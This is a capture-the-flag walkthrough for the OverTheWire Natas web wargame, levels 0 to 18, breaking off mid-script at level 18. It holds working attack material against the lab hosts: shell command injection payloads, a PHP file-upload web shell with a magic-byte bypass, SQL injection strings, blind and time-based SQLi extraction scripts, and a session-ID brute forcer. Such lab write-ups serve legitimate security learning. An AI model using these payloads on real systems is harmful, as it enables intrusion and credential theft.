# OverTheWire - Natas

[![OverTheWire: Natas](https://img.shields.io/badge/OverTheWire-Natas-white)](https://overthewire.org/wargames/natas/)

<details>
<summary><b>Table of Contents</b></summary>

- [OverTheWire - Natas](#overthewire---natas)
  - [Introduction](#introduction)
  - [Level 0](#level-0)
  - [Level 1](#level-1)
  - [Level 2](#level-2)
  - [Level 3](#level-3)
  - [Level 4](#level-4)
  - [Level 5](#level-5)
  - [Level 6](#level-6)
  - [Level 7](#level-7)
  - [Level 8](#level-8)
  - [Level 9](#level-9)
  - [Level 10](#level-10)
  - [Level 11](#level-11)
  - [Level 12](#level-12)
  - [Level 13](#level-13)
  - [Level 14](#level-14)
  - [Level 15](#level-15)
  - [Level 16](#level-16)
  - [Level 17](#level-17)
  - [Level 18](#level-18)
  - [Level 19](#level-19)
  - [Level 20](#level-20)
  - [Level 21](#level-21)
  - [Level 22](#level-22)
  - [Level 23](#level-23)
  - [Level 24](#level-24)
  - [Level 25](#level-25)
  - [Level 26](#level-26)
  - [Level 27](#level-27)

</details>

## Introduction

The `Natas` wargame is a series of web security challenges. Many of the earlier challenges can be solved with the browser's built-in developer tools and command line utilities. For the challenges that can't be solved within those, I like to use `CyberChef`, `Burp Suite Community`, and `Python`. However, there are many other great tools out there that you can use, so just use what you're comfortable with.

**Connecting to Natas**

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org
```

## Level 0

![natas0_index.jpg](screenshots/natas/natas0_index.jpg)

The password for the next level is in the source code of the site.

```bash
curl -s http://natas0:$natas0_pass@natas0.natas.labs.overthewire.org/ | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 1

![natas1_index.jpg](screenshots/natas/natas1_index.jpg)

There is a script blocking right clicking on the site. However, you can still solve the challenge the same way as the last challenge. The source code also contains the password for the current level, so we can use `sed` to remove it from our results.

```bash
curl -s http://natas1:$natas1_pass@natas1.natas.labs.overthewire.org/ | sed "s/$natas1_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 2

![natas2_index.jpg](screenshots/natas/natas2_index.jpg)

When we view the source code, we see this:

![natas2_1.jpg](screenshots/natas/natas2_1.jpg)

The source code reveals a directory named `files`. If we go to the [files](http://natas2.natas.labs.overthewire.org/files/) directory, we see a file named [users.txt](http://natas2.natas.labs.overthewire.org/files/users.txt).

```bash
curl -s http://natas2:$natas2_pass@natas2.natas.labs.overthewire.org/files/users.txt | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 3

![natas3_index.jpg](screenshots/natas/natas3_index.jpg)

If we check the source code, we see this:

![natas3_1.jpg](screenshots/natas/natas3_1.jpg)

This is a hint to the `robots.txt` file, which then reveals a hidden directory, `s3cr3t`:

![natas3_2.jpg](screenshots/natas/natas3_2.jpg)

If we view the contents of [s3cr3t](http://natas3.natas.labs.overthewire.org/s3cr3t/), we see a file named [users.txt](http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt).

```bash
curl -s http://natas3:$natas3_pass@natas3.natas.labs.overthewire.org/s3cr3t/users.txt | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 4

![natas4_index.jpg](screenshots/natas/natas4_index.jpg)

When we connect to the site, we get a message saying only users from `http://natas5.natas.labs.overthewire.org/` are authorized. The way a website can tell where you're coming from is through the `Referer` header. We can set this with the `-e` or `--referer` option in `curl`.

```bash
curl -s http://natas4:$natas4_pass@natas4.natas.labs.overthewire.org/ -e http://natas5.natas.labs.overthewire.org/ | sed "s/$natas4_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 5

![natas5_index.jpg](screenshots/natas/natas5_index.jpg)

We need to figure out a way to be "logged in" on the site. If we check the response headers, we see an interesting header:

```bash
$ curl -Is http://natas5:$natas5_pass@natas5.natas.labs.overthewire.org/ | grep "Set-Cookie"
Set-Cookie: loggedin=0
```

Let's try sending a request with a cookie set to `loggedin=1`. We can do this with the `-b` or `--cookie` option in `curl`.

```bash
curl -s http://natas5:$natas5_pass@natas5.natas.labs.overthewire.org/ -b "loggedin=1" | sed "s/$natas5_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 6

![natas6_index.jpg](screenshots/natas/natas6_index.jpg)

For this challenge, we need to figure out how to get the secret. If we check the [sourcecode](http://natas6.natas.labs.overthewire.org/index-source.html), we see a `php` script:

```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```

It looks like this script is using `include` to include a file named `secret.inc`, which is likely where the secret is being defined. Let's see what's in the file:

```bash
$ curl -s http://natas6:$natas6_pass@natas6.natas.labs.overthewire.org/includes/secret.inc
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

If we look at the first two lines of the script, we can see how to submit our secret:

```php
    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
```

We need to send a `POST` request with the parameters `secret` and `submit`. Now we can now craft a `curl` command to get the password for us.

```bash
curl -s "http://natas6:$natas6_pass@natas6.natas.labs.overthewire.org/" -X 'POST' -d "secret=$(curl -s http://natas6:$natas6_pass@natas6.natas.labs.overthewire.org/includes/secret.inc | grep -oP '\$secret = "\K[^"]+')&submit" | sed "s/$natas6_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 7

![natas7_index.jpg](screenshots/natas/natas7_index.jpg)

For this level, we are presented with a website which contains two links to `Home` and `About`. If check the source code, we can see how the pages are loaded:

![natas7_1.jpg](screenshots/natas/natas7_1.jpg)

It looks like it's loading the page through the `index.php` script using the `page` parameter. If we look at the hint, we see the password is in the `/etc/natas_webpass/natas8` file. Let's try requesting that by replacing the value in the `page` parameter.

```bash
curl -s "http://natas7:$natas7_pass@natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8" | sed "s/$natas7_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 8

![natas8_index.jpg](screenshots/natas/natas8_index.jpg)

Let's check the [sourcecode](http://natas8.natas.labs.overthewire.org/index-source.html):

```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

Here we can see a variable, `encodedSecret`, and a function, `encodeSecret`, being declared. Looks like all we need to do is reverse the `encodeSecret` function so our input matches the `encodedSecret`.

```bash
curl -s "http://natas8:$natas8_pass@natas8.natas.labs.overthewire.org/" -X 'POST' -d "secret=$(curl -s "http://natas8:$natas8_pass@natas8.natas.labs.overthewire.org/index-source.html" | grep -oP '\$encodedSecret&nbsp;=&nbsp;"\K[^"]+' | xxd -p -r | rev | base64 -d)&submit" | sed "s/$natas8_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 9

![natas9_index.jpg](screenshots/natas/natas9_index.jpg)

Here's the [sourcecode](http://natas9.natas.labs.overthewire.org/index-source.html):

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

This page uses the `passthru` command to send our input to the server using the `needle` parameter. Luckily for us, there is no input sanitization so we can enter whatever we want and the server will execute it for us. All we need to do is ensure it can be properly executed with the `grep -i` command.

```bash
curl -s "http://natas9:$natas9_pass@natas9.natas.labs.overthewire.org/" --data-urlencode "needle=. /etc/natas_webpass/natas10;" | sed "s/$natas9_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 10

![natas10_index.jpg](screenshots/natas/natas10_index.jpg)

[Sourcecode](http://natas10.natas.labs.overthewire.org/index-source.html):

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

This challenge is similar to the last level except the characters `;`, `|`, and `&` aren't allowed. Luckily for us, `grep` actually lets us search multiple files by just separating the filenames with a space. We didn't actually need the `;` to solve the last level but I added it so it would only print out the password.

We *could* use `needle=. /etc/natas_webpass/natas11`, but `needle=-he "[[:alnum:]]\{32\}" /etc/natas_webpass/natas11` also works and only returns the password.

```bash
curl -s "http://natas10:$natas10_pass@natas10.natas.labs.overthewire.org/" --data-urlencode 'needle=-he "[[:alnum:]]\{32\}" /etc/natas_webpass/natas11' | sed "s/$natas10_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 11

![natas11_index.jpg](screenshots/natas/natas11_index.jpg)

Alright... So there's quite a bit going on in the [sourcecode](http://natas11.natas.labs.overthewire.org/index-source.html). Let's take it one step at a time. The first step is to identify our goal, which is to get it to print the password, and how to achieve it.

```php
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
```

Ok, so all we have to do is get the `showpassword` parameter to equal `yes`. Well whats stopping us from just entering `showpassword=yes`? It's because of this line right here:

```php
$data = loadData($defaultdata);
```

This line is running the `loadData` function on `data` which is modifying our `data` somehow. Let's take a look at what it's doing:

```php
function loadData($def) {
    // Get cookies
    global $_COOKIE;
    $mydata = $def;
    // Check for data in cookies
    if(array_key_exists("data", $_COOKIE)) {
    // Decrypt data
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    // Make sure array is valid
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        // Make sure bgcolor is a valid color
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}
```

So the only line that really matters is this:

```php
$tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
```

It's taking our cookie value and encrypting it with `xor_encrypt`, which is a standard repeating key XOR function. If you're unfamiliar with XOR, you can read up on it [here](https://en.wikipedia.org/wiki/XOR_cipher).

Basically, things encrypted with XOR shares these properties:

```
a ^ b = c
a ^ c = b
b ^ c = a
```

In terms of encryption, the `a`, `b`, and `c` would be the `plaintext`, `key`, and `ciphertext`. In our case, `plaintext` is the decrypted cookie, `key` is the value used in the `xor_encrypt` function, and `ciphertext` is the base64 decoded cookie. This means we need two out of three of the variables in order to recover the third.

You might not have realized it, but we have enough to recover the key right now. Of course we know what the `ciphertext` is, but how do we know the `plaintext`? It's because we know what the decrypted data *should* look like due to these two lines:

```php
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata))
```

This tells us the decrypted is a json array with the keys `showpassword` and `bgcolor`. We already know what the `bgcolor` is set to because it's given to us, and we can assume `showpassword` is currently set to `no` since we're supposed to change it to `yes`. This means the decrypted data should look something like this:

```json
{"showpassword": "no", "bgcolor": "#ffffff"}
```

We can throw this into [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Decode()From_Base64('A-Za-z0-9%2B/%3D',true)XOR(%7B'option':'UTF8','string':'%7B%22showpassword%22:%22no%22,%22bgcolor%22:%22%23ffffff%22%7D'%7D,'Standard',false)&input=Q2xWTEloNEFTQ3NDQkU4bEF4TWFjRk1aVjJoZFZWb3RFaGhVSlFOVkFtaFNFVjRzRnhGZWFBdyUzRA) to verify for us.

Now we just have to create a new array where `showpassword` is `yes` and encrypt it with the key. We can use [CyberChef](https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'UTF8','string':'qw8J'%7D,'Standard',false)To_Base64('A-Za-z0-9%2B/%3D')&input=eyJzaG93cGFzc3dvcmQiOiJ5ZXMiLCJiZ2NvbG9yIjoiI2ZmZmZmZiJ9) for that as well. This gives us our new cookie value, `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`.

```bash
curl -s "http://natas11:$natas11_pass@natas11.natas.labs.overthewire.org/" -b "data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK" | sed "s/$natas11_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 12

![natas12_index.jpg](screenshots/natas/natas12_index.jpg)

[Sourcecode](http://natas12.natas.labs.overthewire.org/index-source.html):

```php
<?

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
```

Doesn't seem like anything special is going on here. All it's doing is generating a random filename and directory for our uploaded file and giving it a `.jpg` extension. Now we just have to figure out how to upload something that will help us get the password.

We can try uploading a simple `php` script to read the flag:

```php
<?php readfile("test.txt")?>
```

The only problem is it gets renamed to a `jpg` when we upload it through the form, which will prevent our script from being executed. However, since the renaming is done on the client side, we can just send our own request without modifying the extension.

First, we need to figure out how to upload the file:

```bash
echo '<?php readfile("/etc/natas_webpass/natas13")?>' | \
curl -s "http://natas12:$natas12_pass@natas12.natas.labs.overthewire.org/" \
-X 'POST' -F "filename=natas12.php" -F "uploadedfile=@-;filename=natas12.php" | \
grep -oP 'href="\Kupload/[[:alnum:]]{10}.php'
```

Then we get the results of the file we just uploaded:

```bash
curl "http://natas12:$natas12_pass@natas12.natas.labs.overthewire.org/$(echo -n '<?php readfile("/etc/natas_webpass/natas13")?>' | curl -s "http://natas12:$natas12_pass@natas12.natas.labs.overthewire.org/" -X 'POST' -F "filename=natas12.php" -F "uploadedfile=@-;filename=natas12.php" | grep -oP 'href="\Kupload/[[:alnum:]]{10}.php')"
```

[*Back to top*](#overthewire---natas)

## Level 13

![natas13_index.jpg](screenshots/natas/natas13_index.jpg)

[Sourcecode](http://natas13.natas.labs.overthewire.org/index-source.html):

```php
<?

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<? } ?>
```

This level is essentially the same as the last level except for one line:

```php
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
```

Before the file can be uploaded, it needs to pass the [exif_imagetype](https://www.php.net/manual/en/function.exif-imagetype.php#refsect1-function.exif-imagetype-constants) test. As long as the file signature matches any one of the listed image types, the file will be uploaded. We can use [this site](https://www.filesignatures.net/index.php?page=search) to look up valid file signatures. The go-tos are `BM` (`.bmp`) and `GIF8` (`.gif`) since they're both common file types, easy to remember, and their signatures are all ascii so they're easy to add.

**Note:** The characters from the file signature will also show up in the results, so remember to ignore them.

```bash
curl -s "http://natas13:$natas13_pass@natas13.natas.labs.overthewire.org/$(echo -n 'BM<?php readfile("/etc/natas_webpass/natas14");?>' | curl -s "http://natas13:$natas13_pass@natas13.natas.labs.overthewire.org/" -X 'POST' -F "filename=natas13.php" -F "uploadedfile=@-;filename=natas13.php" | grep -oP 'href="\Kupload/[[:alnum:]]{10}.php')" | egrep -o [[:alnum:]]{32}$
```

[*Back to top*](#overthewire---natas)

## Level 14

![natas14_index.jpg](screenshots/natas/natas14_index.jpg)

[Sourcecode](http://natas14.natas.labs.overthewire.org/index-source.html):

```php
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? } ?>
```

This level is a basic SQL injection. All we need to do is insert a statement that completes this query:

```sql
SELECT * from users where username="<username_input>" and password="<password_input>"
```

As long as this query returns at least 1 row, the login will be successful. We also see that the database is using `mysql`. We can do a vanilla SQLi with `" or 1=1#` in the `username` parameter. In `mysql`, the `#` acts as a comment and ignores the rest of the query, which essentially turns our query into this:

```sql
SELECT * from users where username="" or 1=1
```

Now to send our SQLi:

```bash
curl -s "http://natas14:$natas14_pass@natas14.natas.labs.overthewire.org/index.php" --data-urlencode 'username=" or 1=1#' | sed "s/$natas14_pass//g" | egrep -o [[:alnum:]]{32}
```

[*Back to top*](#overthewire---natas)

## Level 15

![natas15_index.jpg](screenshots/natas/natas15_index.jpg)

[Sourcecode](http://natas15.natas.labs.overthewire.org/index-source.html):

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? } ?>
```

This is another SQLi challenge except this time, it doesn't return any results. Instead, it only tells us whether a user exists or not. This is called a `blind SQL injection`. To perform a blind SQLi, we will conduct a series of *true* or *false* queries. If the site responds with `This user exists.`, we know that our input was correct. This allows us to brute force the password one character at a time.

We can do this with the [LIKE](https://dev.mysql.com/doc/refman/8.0/en/string-comparison-functions.html#operator_like) function which allows us to compare strings. Unfortunately, MySQL's string comparision is case-insensitive by default. We can get around this by using the [BINARY](https://dev.mysql.com/doc/refman/8.0/en/binary-varbinary.html) data type. This makes MySQL compare the byte value rather than the string.

We're going to be using `Python` for this challenge since we need to perform a lot of queries. Here is a [simple script](files/natas/natas15.py) to solve this challenge. However, it takes forever to run since it runs each query one at a time, so I rewrote it with `asyncio` to find every character at the same time. The [new and improved script](files/natas/natas15_async.py) finishes running in several seconds as opposed to minutes.

```python
#!/usr/bin/env python3
import requests


url = 'http://natas15.natas.labs.overthewire.org/index.php?username=natas16'
auth = ('natas15', natas15_pass)

def get_charset():
    alnum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    charset = ''
    for char in alnum:
        sqli = f'" and password like binary "%{char}%'
        r = requests.get(url+sqli, auth=auth)
        if 'This user exists.' in r.text:
            charset += char
    return charset

def get_password(charset):
    password = ''
    while True:
        for char in charset:
            sqli = f'" and password like binary "{password+char}%'
            r = requests.get(url+sqli, auth=auth)
            if 'This user exists.' in r.text:
                password += char
                break
        else:
            break
    return password


if __name__ == '__main__':
    charset = get_charset()
    password = get_password(charset)
    print(password)
```

[*Back to top*](#overthewire---natas)

## Level 16

![natas16_index.jpg](screenshots/natas/natas16_index.jpg)

[Sourcecode](http://natas16.natas.labs.overthewire.org/index-source.html):

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

Looks like we have another `grep` challenge. This time, there are a ton of extra characters that aren't allowed in our query. Our input is also wrapped with double quotes to prevent us from grepping multiple files like we did before. This is actually a blessing in disguise because in Linux, the shell will still interpret special characters on strings wrapped with double quotes.

Despite being able to use special characters, we still can't get around the fact that our query is quoted. Anything we send will end up being grepped in `dictionary.txt`. Sounds like another blind injection attack to me. Now we just need to craft a *true* or *false* query that will help us find the password.

We can solve this challenge with command substitution and a nested `grep` command. By using command substitution, we can enumerate the `/etc/natas_webpass/natas17` file with something like this:

```bash
$(grep ^<injection> /etc/natas_webpass/natas17)
```

This will expand to the password, which will make the outer `grep` to search for the password in `dictionary.txt`. We also need to set a default word to look for to indicate wrong answers. Pick any word in the wordlist that is easily identifiable (i.e. does not conflict with any text in the source code).

```bash
$(grep ^<injection> /etc/natas_webpass/natas17)password
```

We can reuse the code from the last challenge to get [this (with asyncio)](files/natas/natas16_async.py) and [this (without asyncio)](files/natas/natas16.py):

```python
#!/usr/bin/env python3
import requests


url = 'http://natas16.natas.labs.overthewire.org/index.php?needle={}password'
auth = ('natas16', natas16_pass)

def get_charset():
    alnum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    charset = ''
    for char in alnum:
        search = f'$(grep {char} /etc/natas_webpass/natas17)'
        r = requests.get(url.format(search), auth=auth)
        if 'password' not in r.text:
            charset += char
    return charset

def get_password(charset):
    password = ''
    while True:
        for char in charset:
            search = f'$(grep ^{password+char} /etc/natas_webpass/natas17)'
            r = requests.get(url.format(search), auth=auth)
            if 'password' not in r.text:
                password += char
                break
        else:
            break
    return password


if __name__ == '__main__':
    charset = get_charset()
    password = get_password(charset)
    print(password)
```

[*Back to top*](#overthewire---natas)

## Level 17

![natas17_index.jpg](screenshots/natas/natas17_index.jpg)

[Sourcecode](http://natas17.natas.labs.overthewire.org/index-source.html):

```php
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<? } ?>
```

Alright, so we have another SQL challenge, but this time, it looks like the `echo` lines are commented out. We no longer have an output to determine whether our query was `true` or `false`. However, this doesn't mean we're out of luck just yet.

We can take advantage of MySQL's [`SLEEP`](https://dev.mysql.com/doc/internals/en/sleep.html) command, which allows us to do a time-based blind SQLi.

[Asyncio](files/natas/natas17_async.py)\
[Without Asyncio](files/natas/natas17.py):

```python
#!/usr/bin/env python3
import requests
from urllib.parse import urlencode


url = 'http://natas17.natas.labs.overthewire.org/index.php?'
auth = ('natas17', natas17_pass)

def get_charset(sleep=1):
    alnum = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    charset = ''
    for char in alnum:
        sqli = ('natas18" and '
               f'password like binary "%{char}%" and '
               f'sleep({sleep})#')
        payload = urlencode({'username': sqli})
        r = requests.get(url+payload, auth=auth)
        if r.elapsed.total_seconds() >= sleep:
            charset += char
    return charset

def get_password(charset, sleep=1):
    password = ''
    while True:
        for char in charset:
            sqli = ('natas18" and '
                   f'password like binary "{password+char}%" and '
                   f'sleep({sleep})#')
            payload = urlencode({'username': sqli})
            r = requests.get(url+payload, auth=auth)
            if r.elapsed.total_seconds() >= sleep:
                password += char
                break
        else:
            break
    return password


if __name__ == '__main__':
    time = 1
    charset = get_charset(time)
    password = get_password(charset, time)
    print(password)
```

[*Back to top*](#overthewire---natas)

## Level 18

![natas18_index.jpg](screenshots/natas/natas18_index.jpg)

[Sourcecode](http://natas18.natas.labs.overthewire.org/index-source.html):

```php
<?

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<? } ?>
```

This next challenge requires us to log in as admin. Let's check the source code to see what it's doing to verify our identity.

```php
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
```

So in order to get it to print the credential for the next level, we need to pass this check:

```php
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
```

The [$_SESSION](https://www.php.net/manual/en/reserved.variables.session.php) is a `superglobal` variable which contains all of the session IDs in an array. Generally, when a new session is created, the server returns the session's ID as a cookie named `PHPSESSID`. Since HTTP is a stateless protocol, this cookie is how the server determines which session is associated to your request. For this challenge, it looks like we need to perform a session hijacking attack to steal the admin's session.

If we look back at the source code, we see this:

```php
$maxid = 640;
...
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
```

Looks like the session ID is just a random integer between 1 and 640. Looks like we can just brute force the admin's session by checking every session ID in that range.

[Asyncio](files/natas/natas18_async.py)\
[Without Asyncio](files/natas/natas18.py):

```python
#!/usr/bin/env python3
import re
import requests


url = 'http://natas18.natas.labs.overthewire.org/'
auth = ('natas18', natas18_pass)

def find_password():
    for i in range(1,641):
        cookies = {'PHPSESSID': str(i)}
        r = requests.get(url, auth=auth, cookies=cookies)
        if 'Username: natas19' in r.text:
